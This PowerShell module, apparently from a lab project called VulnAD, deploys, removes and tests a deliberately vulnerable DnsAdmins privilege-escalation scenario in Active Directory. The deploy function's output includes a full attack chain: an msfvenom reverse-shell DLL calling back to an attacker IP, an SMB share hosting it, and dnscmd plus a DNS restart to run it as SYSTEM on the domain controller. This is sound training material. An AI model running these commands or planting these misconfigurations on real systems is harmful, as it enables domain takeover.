#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys DNS Admins privilege escalation scenarios in Active Directory.

.DESCRIPTION
    Creates a user and adds them to the built-in DnsAdmins group. Members of this
    group can configure the DNS service on Domain Controllers to load an arbitrary
    DLL, effectively achieving SYSTEM-level code execution on the DC. This is a
    well-known privilege escalation vector that requires a DNS service restart.

    MITRE ATT&CK: T1574 - Hijack Execution Flow

.PARAMETER Difficulty
    Scenario difficulty level. Affects password complexity and user placement.
    Valid values: Easy, Medium, Hard.

.PARAMETER DomainDN
    The distinguished name of the domain (e.g., DC=contoso,DC=com).

.PARAMETER Domain
    The NetBIOS or FQDN of the domain (e.g., contoso.com).

.EXAMPLE
    Deploy-DNSAdmins -Difficulty Medium -DomainDN 'DC=contoso,DC=com' -Domain 'contoso.com'

.EXAMPLE
    Remove-DNSAdmins -DomainDN 'DC=contoso,DC=com'

.EXAMPLE
    Test-DNSAdmins -DomainDN 'DC=contoso,DC=com'

.NOTES
    Module: VulnAD - DNS Admins Privilege Escalation
    Author: VulnAD Project
    Requires: ActiveDirectory module, VulnAD-Core.ps1 helpers
    NOTE: Exploitation requires DNS service restart on the DC. This may cause
          a brief DNS outage in the lab environment.
#>

function Deploy-DNSAdmins {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainDN,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Domain
    )

    begin {
        Write-VulnStatus -Message "Deploying DNS Admins scenario [$Difficulty]" -Type 'Info'

        $usersOU   = "OU=Users,OU=ADMonolith,$DomainDN"
        $groupsOU  = "OU=Groups,OU=ADMonolith,$DomainDN"
        $createdObjects = [System.Collections.Generic.List[string]]::new()
    }

    process {
        try {
            # ---------------------------------------------------------------
            # Step 1: Verify the DnsAdmins group exists
            # ---------------------------------------------------------------
            Write-VulnStatus -Message "Verifying built-in DnsAdmins group exists" -Type 'Info'

            try {
                $dnsAdminsGroup = Get-ADGroup -Identity 'DnsAdmins' -ErrorAction Stop
                Write-VulnResult -Name 'DnsAdmins' -Detail "Built-in DnsAdmins group found" -Success $true
            }
            catch {
                Write-VulnResult -Name 'DnsAdmins' -Detail "DnsAdmins group not found. Is DNS role installed?" -Success $false
                Write-VulnStatus -Message "Cannot proceed: DnsAdmins group is required. Ensure the DNS Server role is installed." -Type 'Error'
                return
            }

            # ---------------------------------------------------------------
            # Step 2: Create user d.brown
            # ---------------------------------------------------------------
            Write-VulnStatus -Message "Creating user d.brown (Network Engineer)" -Type 'Info'

            $pwBrown = Get-VulnPassword -Difficulty $Difficulty -Index 5

            $userBrown = New-VulnUser `
                -SamAccountName 'd.brown' `
                -Name 'David Brown' `
                -Password $pwBrown `
                -DomainDN $DomainDN `
                -Description 'Network Engineer - Infrastructure Team'

            if ($userBrown) {
                $createdObjects.Add("CN=David Brown,$usersOU")
                Write-VulnResult -Name 'd.brown' -Detail "User created in VulnAD Users OU" -Success $true
            }
            else {
                Write-VulnResult -Name 'd.brown' -Detail "Failed to create user" -Success $false
                Write-VulnStatus -Message "Cannot proceed without user d.brown" -Type 'Error'
                return
            }

            # ---------------------------------------------------------------
            # Step 3: Add d.brown to DnsAdmins
            # ---------------------------------------------------------------
            Write-VulnStatus -Message "Adding d.brown to DnsAdmins group" -Type 'Info'

            try {
                Add-ADGroupMember -Identity 'DnsAdmins' -Members 'd.brown' -ErrorAction Stop
                Write-VulnResult -Name 'd.brown -> DnsAdmins' -Detail "User added to DnsAdmins group" -Success $true
            }
            catch {
                Write-VulnResult -Name 'd.brown -> DnsAdmins' -Detail "Failed to add to DnsAdmins: $_" -Success $false
            }

            # ---------------------------------------------------------------
            # Step 4: Difficulty-specific enhancements
            # ---------------------------------------------------------------
            switch ($Difficulty) {
                'Easy' {
                    Write-VulnResult -Name 'Difficulty' -Detail "Easy: Direct DnsAdmins membership, clearly visible" -Success $true -IsLast
                }
                'Medium' {
                    # Add d.brown to a plausible cover group
                    try {
                        $coverGroup = New-VulnGroup `
                            -Name 'Network-Infrastructure' `
                            -DomainDN $DomainDN `
                            -Description 'Network infrastructure management team'

                        if ($coverGroup) {
                            $createdObjects.Add("CN=Network-Infrastructure,$groupsOU")
                            Add-ADGroupMember -Identity 'Network-Infrastructure' -Members 'd.brown' -ErrorAction Stop
                            Write-VulnResult -Name 'Network-Infrastructure' -Detail "Cover group created; d.brown is also a member" -Success $true -IsLast
                        }
                        else {
                            Write-VulnResult -Name 'Network-Infrastructure' -Detail "Failed to create cover group" -Success $false -IsLast
                        }
                    }
                    catch {
                        Write-VulnResult -Name 'Network-Infrastructure' -Detail "Cover group setup failed: $_" -Success $false -IsLast
                    }
                }
                'Hard' {
                    # Add cover group and additional service account to create noise
                    try {
                        $coverGroup = New-VulnGroup `
                            -Name 'Network-Infrastructure' `
                            -DomainDN $DomainDN `
                            -Description 'Network infrastructure management team'

                        if ($coverGroup) {
                            $createdObjects.Add("CN=Network-Infrastructure,$groupsOU")
                            Add-ADGroupMember -Identity 'Network-Infrastructure' -Members 'd.brown' -ErrorAction Stop
                        }

                        # Create a decoy service account that looks DNS-related but has no special privs
                        $pwDecoy = Get-VulnPassword -Difficulty $Difficulty -Index 6

                        $decoySvc = New-VulnUser `
                            -SamAccountName 'svc-dns-monitor' `
                            -Name 'DNS Monitoring Service' `
                            -Password $pwDecoy `
                            -DomainDN $DomainDN `
                            -Description 'DNS health monitoring service account' `
                            -ServiceAccount

                        if ($decoySvc) {
                            $svcOU = "OU=ServiceAccounts,OU=ADMonolith,$DomainDN"
                            $createdObjects.Add("CN=DNS Monitoring Service,$svcOU")
                            Add-ADGroupMember -Identity 'Network-Infrastructure' -Members 'svc-dns-monitor' -ErrorAction Stop
                            Write-VulnResult -Name 'Hard obfuscation' -Detail "Cover group and decoy service account created" -Success $true -IsLast
                        }
                        else {
                            Write-VulnResult -Name 'Hard obfuscation' -Detail "Cover group created but decoy service account failed" -Success $false -IsLast
                        }
                    }
                    catch {
                        Write-VulnResult -Name 'Hard obfuscation' -Detail "Obfuscation setup failed: $_" -Success $false -IsLast
                    }
                }
            }
        }
        catch {
            Write-VulnStatus -Message "Critical error during DNS Admins deployment: $_" -Type 'Error'
            throw
        }
    }

    end {
        # Determine the DC hostname for attack commands
        $dcHostname = try {
            (Get-ADDomainController -Discover -ErrorAction SilentlyContinue).HostName
        }
        catch {
            'DC01'
        }

        $result = @{
            Scenario       = 'DNS Admins Privilege Escalation'
            Description    = @(
                'd.brown has been added to the built-in DnsAdmins group.',
                'DnsAdmins members can configure the DNS service on Domain Controllers to',
                'load an arbitrary DLL via the ServerLevelPluginDll registry key.',
                '',
                'When the DNS service is restarted, the malicious DLL executes as SYSTEM',
                'on the Domain Controller, achieving full domain compromise.',
                '',
                'NOTE: Exploitation requires a DNS service restart, which may cause a brief',
                'DNS outage in the lab environment.'
            ) -join "`n"
            CreatedObjects = $createdObjects.ToArray()
            AttackCommands = @(
                '# ============================================================',
                '# DNS Admins DLL Injection Attack',
                '# ============================================================',
                '',
                '# --- Step 1: Generate malicious DLL (attacker machine) ---',
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o evil.dll",
                '',
                '# --- Step 2: Host the DLL on an SMB share (attacker machine) ---',
                '# Option A: Impacket smbserver',
                'python3 smbserver.py share /path/to/dll -smb2support',
                '# Option B: Use any accessible UNC path',
                '',
                '# --- Step 3: Configure DNS service to load the DLL ---',
                "dnscmd $dcHostname /config /serverlevelplugindll \\<attacker_ip>\share\evil.dll",
                '',
                '# --- Step 4: Restart the DNS service ---',
                '# Option A: sc.exe (requires appropriate permissions)',
                "sc.exe \\$dcHostname stop dns",
                "sc.exe \\$dcHostname start dns",
                '',
                '# Option B: PowerShell remoting',
                "Invoke-Command -ComputerName $dcHostname -ScriptBlock { Restart-Service dns -Force }",
                '',
                '# --- Step 5: Catch the reverse shell ---',
                '# The DLL executes as NT AUTHORITY\SYSTEM on the DC',
                '',
                '# --- Cleanup: Remove the DLL configuration ---',
                "dnscmd $dcHostname /config /serverlevelplugindll ''",
                '',
                '# --- Detection: Check current DLL configuration ---',
                'Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll -ErrorAction SilentlyContinue',
                '',
                '# --- Verify DnsAdmins membership ---',
                "Get-ADGroupMember -Identity 'DnsAdmins' | Select-Object name,SamAccountName"
            )
            AttackPath     = @(
                'd.brown (Network Engineer)',
                '  |',
                '  |-- Member of DnsAdmins (built-in group)',
                '  |',
                '  |-- dnscmd: Configure ServerLevelPluginDll on DC',
                '  |     |-- Points to attacker-hosted malicious DLL',
                '  |',
                '  |-- DNS service restart required',
                '  |     |-- sc.exe stop/start dns',
                '  |     |-- OR Restart-Service dns',
                '  |',
                '  |-- DLL executes as SYSTEM on Domain Controller',
                '  |',
                '  |-- Full domain compromise'
            ) -join "`n"
            MitreID        = 'T1574'
            Difficulty     = $Difficulty
        }

        Write-VulnStatus -Message "DNS Admins scenario deployed successfully" -Type 'Success'
        Write-VulnStatus -Message "[!] Note: Exploitation requires DNS service restart on the DC" -Type 'Warning'
        return $result
    }
}

function Remove-DNSAdmins {
    <#
    .SYNOPSIS
        Removes all objects created by the DNS Admins scenario.

    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainDN
    )

    begin {
        Write-VulnStatus -Message "Removing DNS Admins scenario objects" -Type 'Info'
    }

    process {
        # --- Remove d.brown from DnsAdmins ---
        try {
            Remove-ADGroupMember -Identity 'DnsAdmins' -Members 'd.brown' -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name 'DnsAdmins membership' -Detail "d.brown removed from DnsAdmins" -Success $true
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'DnsAdmins membership' -Detail "d.brown not found in DnsAdmins" -Success $true
        }
        catch {
            Write-VulnResult -Name 'DnsAdmins membership' -Detail "Failed to remove from DnsAdmins: $_" -Success $false
        }

        # --- Remove decoy service account (Hard difficulty) ---
        try {
            Remove-ADUser -Identity 'svc-dns-monitor' -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name 'svc-dns-monitor' -Detail "Decoy service account removed" -Success $true
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'svc-dns-monitor' -Detail "Decoy account not found (not created or already removed)" -Success $true
        }
        catch {
            Write-VulnResult -Name 'svc-dns-monitor' -Detail "Failed to remove decoy account: $_" -Success $false
        }

        # --- Remove cover group ---
        try {
            Remove-ADGroup -Identity 'Network-Infrastructure' -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name 'Network-Infrastructure' -Detail "Cover group removed" -Success $true
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'Network-Infrastructure' -Detail "Cover group not found (not created or already removed)" -Success $true
        }
        catch {
            Write-VulnResult -Name 'Network-Infrastructure' -Detail "Failed to remove cover group: $_" -Success $false
        }

        # --- Remove user ---
        try {
            Remove-ADUser -Identity 'd.brown' -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name 'd.brown' -Detail "User removed successfully" -Success $true -IsLast
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'd.brown' -Detail "User not found (already removed)" -Success $true -IsLast
        }
        catch {
            Write-VulnResult -Name 'd.brown' -Detail "Failed to remove user: $_" -Success $false -IsLast
        }
    }

    end {
        Write-VulnStatus -Message "DNS Admins cleanup complete" -Type 'Success'
    }
}

function Test-DNSAdmins {
    <#
    .SYNOPSIS
        Validates that DNS Admins scenario objects exist and are correctly configured.

    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainDN
    )

    begin {
        Write-VulnStatus -Message "Testing DNS Admins scenario" -Type 'Info'
        $allPassed = $true
    }

    process {
        # --- Test user exists ---
        try {
            $user = Get-ADUser -Identity 'd.brown' -ErrorAction Stop
            Write-VulnResult -Name 'd.brown' -Detail "User exists" -Success $true
        }
        catch {
            Write-VulnResult -Name 'd.brown' -Detail "User not found: $_" -Success $false
            $allPassed = $false
        }

        # --- Test DnsAdmins membership ---
        try {
            $dnsMembers = Get-ADGroupMember -Identity 'DnsAdmins' -ErrorAction Stop |
                Select-Object -ExpandProperty SamAccountName

            if ($dnsMembers -contains 'd.brown') {
                Write-VulnResult -Name 'DnsAdmins membership' -Detail "d.brown is a member of DnsAdmins" -Success $true
            }
            else {
                Write-VulnResult -Name 'DnsAdmins membership' -Detail "d.brown is NOT a member of DnsAdmins" -Success $false
                $allPassed = $false
            }
        }
        catch {
            Write-VulnResult -Name 'DnsAdmins membership' -Detail "Failed to check DnsAdmins membership: $_" -Success $false
            $allPassed = $false
        }

        # --- Test DNS service is running (informational) ---
        try {
            $dnsService = Get-Service -Name 'DNS' -ErrorAction SilentlyContinue
            if ($dnsService) {
                $serviceStatus = $dnsService.Status
                Write-VulnResult -Name 'DNS Service' -Detail "DNS service status: $serviceStatus" -Success ($serviceStatus -eq 'Running') -IsLast
            }
            else {
                Write-VulnResult -Name 'DNS Service' -Detail "DNS service not found on this machine (may be on DC)" -Success $true -IsLast
            }
        }
        catch {
            Write-VulnResult -Name 'DNS Service' -Detail "Could not check DNS service: $_" -Success $true -IsLast
        }
    }

    end {
        if ($allPassed) {
            Write-VulnStatus -Message "All DNS Admins tests passed" -Type 'Success'
        }
        else {
            Write-VulnStatus -Message "Some DNS Admins tests failed" -Type 'Warning'
        }
        return $allPassed
    }
}

